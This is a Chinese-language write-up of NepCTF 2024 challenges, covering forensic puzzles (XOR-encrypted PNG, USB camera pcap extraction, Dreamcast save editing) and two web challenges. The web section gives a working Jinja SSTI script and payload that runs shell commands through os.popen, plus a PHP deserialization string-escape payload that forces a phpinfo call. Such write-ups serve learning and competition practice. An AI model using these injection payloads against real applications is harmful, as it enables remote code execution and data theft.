---
title: '2024 NepCTF Writeup'
description: '正常玩通关即可，刚放题的时候以为是 rgss 游戏解包，但是 rxdata 解析出来的 FLAG 碎片不是明文，浪费了很多时间'
pubDate: 2024-08-20
author: 'IHK-1'
tags: ['CTF', 'NepCTF', '2024']
---

# MISC
## NepMagic —— CheckIn

正常玩通关即可，刚放题的时候以为是 rgss 游戏解包，但是 rxdata 解析出来的 FLAG 碎片不是明文，浪费了很多时间

## Nemophila
mimi.py 可以分析出来 key

```plain
secret_is{Frieren&C_SunR15e&Himme1_eterna1_10ve}
```

解压出来的 miaomiao.png 为乱码，与 PNG header 进行异或可以确定，png 与 key 异或即可解出正常图片

异或 secret_is{Frieren&C_SunR15e&Himme1_eterna1_10ve} 的结果

其宽高 CRC 异常

爆破出正确宽高即可

## 3DNep
file 或者 文件头 可以判断出改为见是一个 gltf 文件，但是下载一个 Blender 之类的很麻烦，直接找个在线网站查看即可，模型底部有个汉明码

扫码即可拿到 flag

## NepCamera
对每一个 usb 流进行分析

尝试直接提取

```plain
tshark -r /root/Desktop/NepCamera.pcapng -T fields -e usb.iso.data > /root/Desktop/output
```

JPG 头文件在第 12 字节之后，且每个流前 12 个字节相当有规律，作用可能类似于地址或者排序之类的，实际数据为 12 字节之后的内容

写一个脚本进行提取全部有效内容（不每个流单独提取是因为不确定每个流之间的数据是否单独的，可能第二个流内容也是第一个流内容的一部分）

```python
import os

# 提取流量
command = "tshark -r NepCamera.pcapng -T fields -e usb.iso.data > output"
os.system(command)

# 切割流量
data_hex = open("output", "r").read().replace('\x00', '').replace(',', '\n').split('\n')
out_hex = ''
for item in data_hex:
    if len(item):
        out_hex += item[24:]

# 输出16进制结果
with open('output', 'w') as f:
    f.write(out_hex)

```

现在进行解 16 进制拿到所有图片拼接在一起的内容

```plain
xxd -r -p output > output 
```

那么现在的问题是如何将所有图片分开，最开始想到的是使用 foremost 进行，分离，但是每次提取的图片都没有 flag 的部分，中间缺失了，花费了大量时间确定了问题原因：foremost 分离的文件都是有文件头与文件尾的，然而实际传输过程中图片并不完整（可能是我的方法错误了），那些完整的图片也仅仅只是靠结尾 FF字节 确定是文件尾，导致大量有效信息缺失。

尝试直接通过文件头进行分割文件，切割出所有不完整的图片

```python
data = open("output", "rb").read()
data = data.split(b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01')

for i in range(len(data)):
    item = data[i]
    item = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01' + data[i]

    with open(rf"{i}.jpg", "wb") as f:
        f.write(item)
```

其有效信更多，以下为一个示例：

最终通过残缺的图片帧拼接出 flag

```python
flag{Th3_c4mer4_takes_c1ear_pictures}
```

## DCTris Evolved
尝试查找了 nepctf 2022 的 DCTris WP ，发现需要先找到 BIOS

尝试直接 strings，发现一段特征

通过搜索可以确定为 一个较早版本的 Dreamcast BIOS，版本号 9EA4

但是无法找到这个版本的 Bios ，于是直接找了个 1998 年的 Dreamcast Bios [Sega Dreamcast BIOS :: Emu-Land.net](https://www.emu-land.net/en/consoles/dreamcast/bios)

尝试了多个模拟器，NullDC 以及 nepctf 2022 所使用的 reicast ，发现会有各种问题，闪退，卡死，不能操作等，最后确定使用 Flycast 启动

开始游玩的时候没看清楚题目是总分达到 232323 分所以尝试了使用 CE 修改器进行数值修改，多次尝试都失败了，后面看清楚了是总分达到 232323 分，于是转而从 存档入手。

在模拟器的 /data 目录下的 vmu_save_A1.bin 发现了存档数据

尝试游玩，确定分数的地址在哪

最终对比可以确认，红圈位子为名称与总分值，由于是小端存储的 16 进制数值

```plain
5143 = 0x1417
其中文件存储的格式为 17 14 而非 14 17
```

所以推测总积分也是一样，最终找到了总积分存储数据的 位置 

尝试前后随意修改几位较多的数值，发现成功修改

且在每局游戏结束，会提示 FLAG IN VMU（虽然能直接在 010中看到，但是不会触发 FLAG）

该模拟器设置中提供了 VMU 的选项

修改完成后可以在左上角看到 FLAG

最后拼接得到完整 FLAG，其中三个点卡了我很久，一直以为是下划线或者两个点，痛失 一血

```plain
NepCTF{Celebrating...Tetris_40TH_Anniversary!}
```

# WEB
## NepDouple
开始以为是路径穿越，尝试了 ../ 但是其当作文件名时会被禁止，可控的点只有 文件名，文件内容，其中代码有两个特殊的函数，而非对模板直接渲染，其中的 render_template_string 存在 SSTI

现在只需要对文件名 SSTI 即可，编写一个脚本，方便进行一次性操作

```python
import zipfile
import html
import requests

def send_file(url, file_path):
    with open(file_path, 'rb') as f:
        files = {'tp_file': (file_path, f)}
        response = requests.post(url, files=files)
    print(html.unescape(response.text))

url = 'https://neptune-23698.nepctf.lemonprefect.cn/'
file_name = r"{{ 1+1 }}"

with open(file_name, 'w') as f:
    f.write("test")
zipfile = zipfile.ZipFile('test.zip', 'w')
zipfile.write(filename=file_name)
zipfile.close()

send_file(url, 'test.zip')
```

其中返回值为 2，直接模板注入，payload：

```plain
lipsum.__globals__['os'].popen('cd ..;cd ..;cd ..;cd ..;cat flag').read()
```

## PHP_MASTER!!
对链子进行分析，非常简单的链子

```plain
C::__destruct() --> B::_tostring() --> A::readflag()
```

但是每个点构造起来十分麻烦

由于 类B 可以调用自定义函数，所以先从 类 B 看起，构造phpinfo()，其中 类 B 对 nep 进行了严格过滤

从 nep1 进行入手，其处理函数如下

分析为 从第一个 [ 出现的位置之后，截取到 ] 出现的位子之前，再偏移几位，那么可以尝试

```plain
]必须得放在第一位，因为放在后面那么就会变成 NepCTF].....] ，输出是第一个]的位子，必然只有 NepCTF 结果，而不会出现 NepCTF] 

那么$end是0，那么想截取后面的值，那么只能是负数了，需要构建一个 string[x+1:-1-x] 为 NepCTF]

最终构造如下：
]              [NepCTF]
start = 15
end = 0
```

```php
<?php
function substrstr($data)
{
    $start = mb_strpos($data, "[");
    $end = mb_strpos($data, "]");
    return mb_substr($data, $start + 1, $end - 1 - $start);
}

$str = substrstr("]              [NepCTF][welcome to CTF]"); 
echo $str;
?>
```

再分析 类 C，分析构造的话需要伪造一个新的 B 类，正常攻击 payload 如下

```php
<?php
class B
{
	public $b = "phpinfo";
}
class C
{
    public $s;
    public $str;
}
$b = new B();

$c = new c();
$c -> s = "test";
$c -> str = $b;

echo serialize($c);
?>
// O:1:"C":2:{s:1:"s";s:4:"test";s:3:"str";O:1:"B":1:{s:1:"b";s:7:"phpinfo";}}
```

可是实际只能做到

```php
<?php
class B
{
	public $b = "phpinfo";
}
class C
{
    public $s;
    public $str;
}
$b = new B();

$c = new c();
$c -> s = "test";

echo serialize($c);
?>
// O:1:"C":2:{s:1:"s";s:4:"test";s:3:"str";N;}
```

那么想要其触发，可以伪造成

```plain
s = test";s:3:"str";O:1:"B":1:{s:1:"b";s:7:"phpinfo";}}
那么序列化后会变成 O:1:"C":2:{s:1:"s";s:4:"test";s:3:"str";O:1:"B":1:{s:1:"b";s:7:"phpinfo";}}";s:3:"str";N;}
```

其为一个增加绕过，那么只要构造一个 payload 长度，00 *n  即 2*n 的长度后刚好为 \0*n 的长度即 1*n + payload，那么 n 为 payload 长度，最终构造如下：

```plain
\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\";s:3:\"str\";O:1:\"B\":1:{s:1:\"b\";s:7:\"phpinfo\";}}
```

进行 url 编码后访问，同时传参 nep=]              [NepCTF]  成功执行 phpinfo()

由于 GZ 平台的原因，FLAG需要设置在环境变量中，所以可以使用 phpinfo 拿到 flag

